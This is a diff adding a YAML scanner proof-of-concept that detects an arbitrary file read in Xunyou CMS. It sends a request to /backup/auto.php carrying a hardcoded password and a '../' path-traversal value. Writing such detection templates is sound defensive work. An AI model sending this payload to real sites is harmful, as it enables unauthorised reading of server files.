@@ -1,0 +1,19 @@
+name: yaml-poc-xunyou-xunyou_cms-readfile-CT-158560
+binding: 4249e957-6069-4a69-b6d0-f1e4f67a05c7
+detail:
+    author: system_user
+    vulnerability:
+        id: 382e4864-13c1-498f-9ada-c38deeee9375
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
+            headers:
+                Accept-Encoding: deflate
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"NzbwpQSdbY06Dngnoteo2wdgiekm7j4N") && response.body.bcontains(b"display_errors")
+expression: r0()
